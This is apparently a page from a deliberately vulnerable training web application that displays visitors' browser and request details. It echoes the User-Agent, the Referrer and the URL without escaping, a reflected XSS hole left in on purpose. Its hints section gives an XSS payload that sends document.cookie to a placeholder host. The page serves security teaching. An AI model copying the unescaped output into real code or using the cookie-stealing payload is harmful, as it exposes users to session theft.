<div class="page-title"><h2>User agent string and other browser info</h2></div>

<B>Info obtained by PHP on the server:</B><P>
<TABLE cellpadding="5" width="65%" align="center">
<?php 
table_print ("IP",$_SERVER['REMOTE_ADDR']);
$hostname=gethostbyaddr($_SERVER['REMOTE_ADDR']);
table_print ("Hostname",gethostbyaddr($_SERVER['REMOTE_ADDR']));
table_print ("Operating System",find_os());
table_print ("Entire User Agent String",$_SERVER['HTTP_USER_AGENT']);
table_print ("Referrer",$_SERVER['HTTP_REFERER']);
table_print ("Remote Client Port:",$_SERVER['REMOTE_PORT']);
# table_print ("WhoIs info for your IP:", "<small><pre>".WhoIs($_SERVER['REMOTE_ADDR'])."</pre></small>");
echo $HTTP_COOKIE_VARS["TestCookie"];
function WhoIs($DomainName)
{ //This function by Andrew Pociu , small mods by Adrian Crenshaw
  // Open a socket to geektools.com, one of the whois servers
  $Socket = fsockopen("whois.arin.net", 43, $ErrorNum, $ErrorStr) or die("$errno: $errstr");
  fputs($Socket, $DomainName."\n");
  // Receive data from the whois server and put into a string
  while(!feof($Socket))
  {
    $WhoIsString .= fgets($Socket, 2048);
  }
  // Close the stream and return the string
  fclose($Socket);
  return $WhoIsString;
}

?>
</TABLE>

<B>Info obtained by JavaScript on the client:</B><P>

<script language="javascript" type="text/javascript">
<!--

document.write('<TABLE cellpadding="5"  width="65%" align="center">');

JSTable_print("Java Enabled",navigator.javaEnabled());
//JSTable_print("IP", java.net.InetAddress.getLocalHost().getHostAddress());

JSTable_print("Browser",navigator.appName);
JSTable_print("Browser Version",navigator.appVersion);
JSTable_print("Platform",navigator.platform);
JSTable_print("CPU Class",navigator.cpuClass);

var tp="";
if (navigator.appName=="Netscape"){
	var tdes="Plugins";
	for (i in navigator.plugins)
	{
		if (tp!=navigator.plugins[i].name){
 			JSTable_print(tdes,navigator.plugins[i].name);
			tdes="";
		}
	tp=navigator.plugins[i].name;
	}
}

JSTable_print("System Language",navigator.systemLanguage);
JSTable_print("Resolution",screen.width+"x"+screen.height);
JSTable_print("Color Depth",screen.colorDepth);
JSTable_print("Referrer",document.referrer);
JSTable_print("URL",unescape(document.location));

document.write("</TABLE>");

function JSTable_print(description,value) 
{ 
document.write('<TR><TD><FONT color="#990099">' + description + '</FONT></TD><TD>' + value + '</TD></TR>');
} 
// -->
</script> 


<?php //PHP Functions
function table_print($description, $value){

	echo '<TR><TD valign="top"><FONT color="#990099">'.$description.'</FONT></TD><TD>'.$value.'</TD></TR>';

}


    function find_os()

    {

    $browserarray=explode("; ",$_SERVER['HTTP_USER_AGENT']);

    $os= $browserarray[2]; 

    return $os;

    }
    function find_browser()

    {

    $browserarray=explode("; ",$_SERVER['HTTP_USER_AGENT']);

    if ($browserarray[1]=="U"){

    $browser = $browserarray[4];

    }else {

    $browser = $browserarray[1];

    }

    return $browser;

    }

?>
<?php
// Begin hints section
if ($_COOKIE["showhints"]==1) {
	echo '<p><span style="background-color: #FFFF00">
	<b>For XSS:</b>This implementation is purely a reflected XSS attack, 
	however it may show up in an admin\'s logs when they go to check out what
	sort of browser their viewers are using. That should be a big hint for how
	to attack this app. "&lt;script&gt;alert("XSS");&lt;/script&gt;" is the classic, but 
	there are far more interesting things you could do which I plan show in a video later. 
	For some hot cookie stealing action, try something like:
	<pre>
	&lt;script&gt;
		new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
	&lt;/script&gt;
	</pre>	
	Also, check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheat Sheet</a>
	for more ways you can encode XSS attacks that may allow you to get around some filters.
	<br><br>
	</span>'; 
}
// End hints section
?>
